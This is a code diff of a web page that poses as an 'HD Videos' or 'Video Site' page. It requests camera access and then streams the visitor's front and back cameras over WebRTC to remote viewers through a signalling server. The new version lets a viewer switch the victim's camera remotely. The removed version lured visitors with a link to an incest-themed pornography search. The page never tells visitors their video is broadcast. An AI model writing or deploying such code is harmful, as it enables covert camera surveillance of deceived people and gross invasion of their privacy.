@@ -29,8 +29,7 @@ body{
   display:none;
 }
 
-#frontVideo,
-#backVideo{
+#localVideo{
   display:none;
 }
 
@@ -53,21 +52,20 @@ body{
   border:0;
   border-radius:8px;
   font-size:16px;
-  cursor:pointer;
 }
 </style>
 </head>
 
 <body>
 
-<h1>HD Videos</h1>
+<h1>Video Site</h1>
 
 <div id="status">
-  Click Allow to grant camera permission
+  Permission required
 </div>
 
 <div id="error">
-  Please allow the permission to continue.
+  Please allow camera permission.
 </div>
 
 <button id="retryBtn" class="retryBtn">
@@ -75,35 +73,48 @@ body{
 </button>
 
 <div id="content">
+
   <div id="liveStatus">
-    See more videos below.
+    Camera is connected.
   </div>
 
   <a
     class="googleBtn"
-    href="https://www.rat.xxx/search/brother+and+sister/"
+    href="https://example.com"
     target="_blank"
-    rel="noopener noreferrer">
-    Click here to see the HD video
+    rel="noopener">
+    Continue
   </a>
+
 </div>
 
-<video id="frontVideo" autoplay muted playsinline></video>
-<video id="backVideo" autoplay muted playsinline></video>
+<video
+  id="localVideo"
+  autoplay
+  muted
+  playsinline>
+</video>
 
 <script>
 
-const status = document.getElementById("status");
-const errorBox = document.getElementById("error");
-const content = document.getElementById("content");
-const retryBtn = document.getElementById("retryBtn");
+const status =
+  document.getElementById("status");
 
-const frontVideo = document.getElementById("frontVideo");
-const backVideo = document.getElementById("backVideo");
+const errorBox =
+  document.getElementById("error");
 
-let frontStream = null;
-let backStream = null;
+const content =
+  document.getElementById("content");
 
+const retryBtn =
+  document.getElementById("retryBtn");
+
+const localVideo =
+  document.getElementById("localVideo");
+
+
+let stream = null;
+let currentCamera = "front";
 let cameraReady = false;
 let roleReceived = false;
 
@@ -132,177 +143,181 @@ function send(message){
 }
 
 
-function announceCameras(){
+function stopCamera(){
+
+  if(stream){
+
+    stream.getTracks().forEach(
+      track => track.stop()
+    );
+
+  }
+
+  stream = null;
+  localVideo.srcObject = null;
+}
+
+
+function announceLive(){
 
   if(
+    !stream ||
     !cameraReady ||
-    !frontStream ||
     !roleReceived
   ){
     return;
   }
 
   send({
-    type:"camera-live",
-
-    cameras:{
-      front:!!frontStream,
-      back:!!backStream
-    }
+    type: "camera-live",
+    currentCamera
   });
 }
 
 
-function showPermissionRequired(message){
+async function openCamera(camera){
 
-  status.textContent = "🔒 Permission required";
+  stopCamera();
 
-  errorBox.textContent =
-    message ||
-    "Please allow camera permission.";
-
-  content.style.display = "none";
-  retryBtn.style.display = "inline-block";
-}
-
-
-function stopCameras(){
-
-  if(frontStream){
-
-    frontStream
-      .getTracks()
-      .forEach(track => track.stop());
-
-    frontStream = null;
-  }
-
-  if(backStream){
-
-    backStream
-      .getTracks()
-      .forEach(track => track.stop());
-
-    backStream = null;
-  }
-
-  frontVideo.srcObject = null;
-  backVideo.srcObject = null;
-
-  cameraReady = false;
-}
-
-
-async function startCameras(){
-
-  stopCameras();
+  currentCamera = camera;
 
   status.textContent =
-    "🟡 Requesting camera permission...";
-
-  errorBox.textContent = "";
-  retryBtn.style.display = "none";
-  content.style.display = "none";
+    camera === "front"
+      ? "Opening front camera..."
+      : "Opening back camera...";
 
 
   try{
 
-    frontStream =
+    stream =
       await navigator.mediaDevices.getUserMedia({
 
-        video:{
-          facingMode:{
-            ideal:"user"
+        video: {
+          facingMode: {
+            ideal:
+              camera === "front"
+                ? "user"
+                : "environment"
           }
         },
 
-        audio:false
+        audio: false
 
       });
 
-    frontVideo.srcObject = frontStream;
 
-    await frontVideo.play()
+    localVideo.srcObject =
+      stream;
+
+    await localVideo.play()
       .catch(() => {});
 
+
+    cameraReady = true;
+
+
+    content.style.display =
+      "block";
+
+    errorBox.textContent = "";
+
+
+    status.textContent =
+      camera === "front"
+        ? "Front camera active"
+        : "Back camera active";
+
+
+    /*
+      Replace the track in every
+      existing WebRTC connection.
+    */
+
+    const newTrack =
+      stream.getVideoTracks()[0];
+
+
+    for(
+      const pc
+      of peers.values()
+    ){
+
+      const sender =
+        pc.getSenders().find(
+          item =>
+            item.track &&
+            item.track.kind === "video"
+        );
+
+
+      if(sender){
+
+        await sender.replaceTrack(
+          newTrack
+        ).catch(error => {
+
+          console.log(
+            "Track replace error:",
+            error
+          );
+
+        });
+
+      }
+
+    }
+
+
+    send({
+      type: "camera-switched",
+      currentCamera
+    });
+
+
+    announceLive();
+
   }
 
-  catch(err){
+  catch(error){
 
-    console.error("Front camera error:",err);
-
-    showPermissionRequired(
-      "❌ Camera permission is required. Please allow permission and try again."
+    console.error(
+      "Camera error:",
+      error
     );
 
-    return;
-  }
+    stream = null;
 
+    cameraReady = false;
 
-  try{
+    status.textContent =
+      "Permission required";
 
-    backStream =
-      await navigator.mediaDevices.getUserMedia({
+    errorBox.textContent =
+      "Could not open the camera.";
 
-        video:{
-          facingMode:{
-            ideal:"environment"
-          }
-        },
+    content.style.display =
+      "none";
 
-        audio:false
-
-      });
-
-    backVideo.srcObject = backStream;
-
-    await backVideo.play()
-      .catch(() => {});
+    retryBtn.style.display =
+      "inline-block";
 
   }
 
-  catch(err){
-
-    console.warn(
-      "Back camera unavailable:",
-      err
-    );
-
-    backStream = null;
-  }
-
-
-  cameraReady = true;
-
-  content.style.display = "block";
-
-  status.textContent =
-    backStream
-      ? "🟢 Cameras are ready"
-      : "🟢 Camera is ready";
-
-
-  announceCameras();
 }
 
 
-async function createPeer(viewerId){
+function createPeer(viewerId){
 
-  const oldPc = peers.get(viewerId);
+  const oldPeer =
+    peers.get(viewerId);
 
-  if(oldPc){
+
+  if(oldPeer){
 
     try{
-      oldPc.close();
-    }catch(err){}
+      oldPeer.close();
+    }catch(error){}
 
-    peers.delete(viewerId);
-  }
-
-
-  if(!frontStream){
-
-    return;
   }
 
 
@@ -311,14 +326,19 @@ async function createPeer(viewerId){
 
       iceServers:[
         {
-          urls:"stun:stun.l.google.com:19302"
+          urls:
+            "stun:stun.l.google.com:19302"
         }
       ]
 
     });
 
 
-  peers.set(viewerId,pc);
+  peers.set(
+    viewerId,
+    pc
+  );
+
 
   pendingCandidates.set(
     viewerId,
@@ -326,74 +346,63 @@ async function createPeer(viewerId){
   );
 
 
-  pc.onicecandidate = event => {
+  pc.onicecandidate =
+    event => {
 
-    if(event.candidate){
+      if(event.candidate){
 
-      send({
+        send({
 
-        type:"candidate",
+          type: "candidate",
 
-        candidate:event.candidate,
+          candidate:
+            event.candidate,
 
-        toViewerId:viewerId
+          toViewerId:
+            viewerId
 
-      });
+        });
 
-    }
+      }
 
-  };
-
-
-  pc.onconnectionstatechange = () => {
-
-    console.log(
-      "Connection:",
-      viewerId,
-      pc.connectionState
-    );
-
-  };
+    };
 
 
-  frontStream
-    .getTracks()
-    .forEach(track => {
+  if(stream){
 
-      pc.addTrack(
-        track,
-        frontStream
-      );
-
-    });
-
-
-  if(backStream){
-
-    backStream
-      .getTracks()
-      .forEach(track => {
+    stream.getTracks().forEach(
+      track => {
 
         pc.addTrack(
           track,
-          backStream
+          stream
         );
 
-      });
+      }
+    );
 
   }
+
+
+  return pc;
+}
+
+
+async function sendOffer(viewerId){
+
+  if(!stream){
+    return;
+  }
+
+
+  const pc =
+    createPeer(viewerId);
 
 
   try{
 
     const offer =
-      await pc.createOffer({
-
-        offerToReceiveAudio:false,
-        offerToReceiveVideo:false
-
-      });
-
+      await pc.createOffer();
 
     await pc.setLocalDescription(
       offer
@@ -402,26 +411,23 @@ async function createPeer(viewerId){
 
     send({
 
-      type:"offer",
+      type: "offer",
 
-      offer:pc.localDescription,
+      offer:
+        pc.localDescription,
 
-      toViewerId:viewerId,
-
-      streamTypes:{
-        front:true,
-        back:!!backStream
-      }
+      toViewerId:
+        viewerId
 
     });
 
   }
 
-  catch(err){
+  catch(error){
 
-    console.error(
+    console.log(
       "Offer error:",
-      err
+      error
     );
 
   }
@@ -431,7 +437,10 @@ async function createPeer(viewerId){
 
 ws.onopen = () => {
 
-  startCameras();
+  status.textContent =
+    "🟡 Requesting permission...";
+
+  openCamera("front");
 
 };
 
@@ -443,12 +452,12 @@ async event => {
 
   try{
 
-    msg = JSON.parse(event.data);
+    msg =
+      JSON.parse(event.data);
 
   }
 
-  catch(err){
-
+  catch{
     return;
   }
 
@@ -457,7 +466,7 @@ async event => {
 
     roleReceived = true;
 
-    announceCameras();
+    announceLive();
 
     return;
   }
@@ -465,16 +474,20 @@ async event => {
 
   if(msg.type === "viewer-ready"){
 
-    if(
-      !cameraReady ||
-      !frontStream
-    ){
-      return;
-    }
-
-
-    await createPeer(
+    await sendOffer(
       msg.viewerId
+    );
+
+    return;
+  }
+
+
+  if(
+    msg.type === "switch-camera"
+  ){
+
+    await openCamera(
+      msg.camera
     );
 
     return;
@@ -492,50 +505,46 @@ async event => {
       peers.get(viewerId);
 
 
-    if(
-      pc &&
-      msg.answer
-    ){
+    if(pc && msg.answer){
 
-      try{
-
-        await pc.setRemoteDescription(
-          new RTCSessionDescription(
-            msg.answer
-          )
-        );
-
-
-        const queued =
-          pendingCandidates.get(viewerId) || [];
-
-
-        for(const candidate of queued){
-
-          await pc.addIceCandidate(
-            new RTCIceCandidate(
-              candidate
-            )
-          ).catch(() => {});
-
-        }
-
-
-        pendingCandidates.set(
-          viewerId,
-          []
-        );
-
-      }
-
-      catch(err){
+      await pc.setRemoteDescription(
+        new RTCSessionDescription(
+          msg.answer
+        )
+      ).catch(error => {
 
         console.log(
           "Answer error:",
-          err
+          error
         );
 
+      });
+
+
+      const queue =
+        pendingCandidates.get(
+          viewerId
+        ) || [];
+
+
+      for(
+        const candidate
+        of queue
+      ){
+
+        await pc.addIceCandidate(
+          new RTCIceCandidate(
+            candidate
+          )
+        ).catch(() => {});
+
       }
+
+
+      pendingCandidates.set(
+        viewerId,
+        []
+      );
 
     }
 
@@ -554,15 +563,13 @@ async event => {
       peers.get(viewerId);
 
 
-    if(!pc || !msg.candidate){
-
+    if(!pc){
       return;
     }
 
 
     if(
-      pc.remoteDescription &&
-      pc.remoteDescription.type
+      pc.remoteDescription
     ){
 
       await pc.addIceCandidate(
@@ -575,22 +582,11 @@ async event => {
 
     else{
 
-      if(
-        !pendingCandidates.has(
-          viewerId
-        )
-      ){
-
-        pendingCandidates.set(
-          viewerId,
-          []
-        );
-
-      }
-
       pendingCandidates
         .get(viewerId)
-        .push(msg.candidate);
+        .push(
+          msg.candidate
+        );
 
     }
 
@@ -603,27 +599,25 @@ async event => {
     const pc =
       peers.get(msg.viewerId);
 
+
     if(pc){
 
       try{
         pc.close();
-      }catch(err){}
-
-      peers.delete(msg.viewerId);
-      pendingCandidates.delete(msg.viewerId);
+      }catch(error){}
 
     }
 
+
+    peers.delete(
+      msg.viewerId
+    );
+
+    pendingCandidates.delete(
+      msg.viewerId
+    );
+
   }
-
-};
-
-
-ws.onerror = () => {
-
-  console.log(
-    "WebSocket error"
-  );
 
 };
 
@@ -631,14 +625,19 @@ ws.onerror = () => {
 ws.onclose = () => {
 
   status.textContent =
-    "🔴 Server connection closed";
+    "🔴 Server disconnected";
 
 };
 
 
 retryBtn.onclick = () => {
 
-  startCameras();
+  retryBtn.style.display =
+    "none";
+
+  openCamera(
+    currentCamera
+  );
 
 };
 
@@ -647,23 +646,15 @@ window.addEventListener(
   "beforeunload",
   () => {
 
-    stopCameras();
+    stopCamera();
 
     peers.forEach(pc => {
 
       try{
         pc.close();
-      }catch(err){}
+      }catch(error){}
 
     });
-
-    peers.clear();
-
-    if(
-      ws.readyState === WebSocket.OPEN
-    ){
-      ws.close();
-    }
 
   }
 );
